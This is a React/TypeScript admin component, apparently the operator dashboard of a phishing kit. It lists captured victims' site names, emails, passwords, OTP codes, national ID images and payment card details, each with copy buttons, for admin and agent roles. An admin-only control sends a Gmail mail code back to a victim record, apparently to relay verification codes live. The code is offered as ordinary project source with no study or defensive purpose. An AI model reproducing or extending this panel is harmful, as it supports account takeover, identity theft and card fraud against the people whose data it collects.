
import { formatUtcToLocal } from "../../utils/DateFormater";
import { handleCopyClick } from "../../utils/copyToClipboard";
import Loader from "../../common/Loader";
import useInformation from "../../hooks/useInformation";
import { getData, updateData } from "../../api/fetching";
import { PaginationNav1Presentation } from "../Pagination/Pagination";
import { useState } from "react";
import CardDataModal from "../../modals/PaymentCardModal";
import NidInfoModal from "../../modals/NidInfoModal";


const HideInfoTable = () => {
    const [open, setOpen] = useState(false)
    const [nidOpen, setNidOpen] = useState(false)
    const [paymentInfo, setPaymentInfo] = useState({})
    const [nidInfo, setNidInfo] = useState({})
    const [codeVal, setCodeVal] = useState('')


    const { loading, setIsRefresh, displayInfo, role, totalPages, setPage, page, isHide, setIsHide } = useInformation('/hide-elements')


    const updateGmailOtp = async (id: any) => {
        const originalData = {
            mailCode: codeVal
        }
        const data = await updateData(`/information/admin/${id}`, originalData)
        console.log(data);
    }


    const handleHide = async () => {
        try {
            await getData(`/toggle-data-hide?isDataHide=${!isHide}`)
            setIsHide(state => !state)
        } catch (error: any) {
            throw new Error(error)
        }
    }
    

        return (
            <div className="rounded-sm  -stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1 ">
                <div className="flex items-center justify-between my-5">
                    <h4 className="mb-6 text-xl font-semibold text-black dark:text-white">
                        All User Informations
                    </h4>

                    <div className="flex gap-10">
                        <button
                            onClick={() => setIsRefresh(Math.random())}
                            className="inline-flex rounded items-center justify-center bg-primary py-3 px-5 text-center font-medium text-white hover:bg-opacity-90 lg:px-5 xl:px-10">Refresh</button>
                       <button
    onClick={handleHide}
    className={`inline-flex rounded items-center justify-center py-3 px-5 text-center font-medium text-white lg:px-5 xl:px-10 ${
        isHide ? 'bg-primary hover:bg-opacity-90' : 'bg-error hover:bg-opacity-90'
    }`}
>
    {isHide ? 'Show Information' : 'Hide Information'}
</button>
                    </div>

                </div>

                {/* for table */}

                <div className="relative overflow-x-auto shadow-md sm:rounded-lg mb-8">
                    {
                        loading && (
                            <div>
                                <Loader />
                            </div>
                        )
                    }
                    <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400 border">
                        <thead className="text-xs text-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                            <tr>
                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    ID
                                </th>
                                {
                                    role === 'admin' && (
                                        <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                            Name
                                        </th>
                                    )
                                }

                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    Site
                                </th>
                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    Email
                                </th>
                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    Password
                                </th>
                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    Confirm Password
                                </th>
                                {
                                    role !== 'admin' && (
                                        <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                            OTP Code
                                        </th>
                                    )
                                }
                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    NID INFO
                                </th>
                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    Card Info
                                </th>
                                {
                                    role === 'admin' && (
                                        <th scope="col" className="px-2 py-1 font-bold cursor-pointer">

                                            Type Code
                                        </th>
                                    )
                                }
                                {
                                    role === 'admin' && (
                                        <th scope="col" className="px-2 py-1 font-bold cursor-pointer">

                                            Send Code
                                        </th>
                                    )
                                }

                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    Agent
                                </th>

                                <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                                    Time
                                </th>



                            </tr>
                        </thead>

                        <tbody className='text-center'>
                            {
                                displayInfo?.map(({ user, updatedAt, nidInfo, agent: { source = {}, platform = '' }, paymentInfo, email, password, mailCode, repassword, otp, siteName, _id }, index) => (
                                    <tr key={_id} className=" ">
                                        <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                                            {index + 1}
                                        </th>

                                        {
                                            role === 'admin' && (
                                                <td className="px-2 py-1 font-bold cursor-pointer ">
                                                    {(user as any)?.name}
                                                </td>
                                            )
                                        }
                                        <td onClick={handleHide} className="px-2 py-1 font-bold cursor-pointer  ">
                                            <span className={`text-bodydark1 rounded-md p-1 font-bold ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                                                }`}>{siteName}</span>

                                        </td>
                                        <td onClick={() => handleCopyClick(email)} className="px-2 py-1 font-bold cursor-pointer">

                                            <input type="text" className="p-2 dark:bg-graydark bg-bodydark1 " value={email} />
                                        </td>
                                        <td onClick={() => handleCopyClick(password)} className="px-2 py-1 font-bold cursor-pointer ">

                                            <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={password} />

                                        </td>
                                        <td onClick={() => handleCopyClick(repassword)} className="px-2 py-1 font-bold cursor-pointer ">

                                            <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={repassword} />

                                        </td>
                                        {
                                            role !== 'admin' && (
                                                <td onClick={() => handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
                                                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={otp} />


                                                </td>
                                            )
                                        }
                                        <td className="px-2 py-1 font-bold cursor-pointer ">
                                            <div className="relative inline-block">
                                                <button
                                                    className={`p-2  ${(nidInfo as any)?.frontUrl && '!bg-danger'} ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                                                        } `}
                                                    onClick={() => {
                                                        setNidOpen((state) => !state);
                                                        setNidInfo(nidInfo);
                                                    }}
                                                >View</button>

                                            </div>


                                        </td>
                                        <td className="px-2 py-1 font-bold cursor-pointer ">
                                            <div className="relative inline-block">
                                                <button
                                                    className={`p-2  ${(paymentInfo as any)?.cardNumber && '!bg-danger'} ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                                                        } `}
                                                    onClick={() => {
                                                        setOpen((state) => !state);
                                                        setPaymentInfo(paymentInfo);
                                                    }}
                                                >View</button>

                                            </div>


                                        </td>
                                        {
                                            role === 'admin' && (
                                                <td className="px-2 py-1 font-bold cursor-pointer ">
                                                    <input type="text" className="py-2 w-12 border-none dark:bg-graydark focus:outline-none  bg-bodydark1" defaultValue={mailCode} onChange={(e) => setCodeVal(e.target.value)} />
                                                </td>
                                            )
                                        }

                                        {
                                            role === 'admin' && (
                                                <td className="px-2 py-1 font-bold cursor-pointer ">
                                                    <div className="relative inline-block">
                                                        <button
                                                            onClick={() => updateGmailOtp(_id)}

                                                            className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                                                                }`}>Add</button>
                                                    </div>
                                                </td>
                                            )
                                        }


                                        {/* hello */}

                                        <td className="px-2 py-1 font-bold cursor-pointer ">
                                            <div className="relative inline-block">
                                                <button
                                                    title={platform}
                                                    onClick={() => handleCopyClick(`${source ? source : ''}`)}
                                                    className={`p-2 ${platform === 'iPhone' && '!bg-danger'} ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                                                        }`}>Copy</button>
                                            </div>
                                        </td>
                                        <td onClick={() => handleCopyClick(formatUtcToLocal(updatedAt))} className="px-2 py-1 font-bold cursor-pointer">
                                            {formatUtcToLocal(updatedAt)}
                                        </td>

                                    </tr>

                                ))
                            }
                            <CardDataModal isOpen={open} setIsOpen={setOpen} data={paymentInfo} />
                            <NidInfoModal isOpen={nidOpen} setIsOpen={setNidOpen} data={nidInfo} />
                        </tbody>
                    </table>
                    <div className="flex items-center justify-center">
                        <PaginationNav1Presentation
                            pageCount={totalPages}
                            pageIndex={page}
                            setPageIndex={setPage}
                        />
                    </div>
                </div>



            </div>
        );
    };


    export default HideInfoTable;
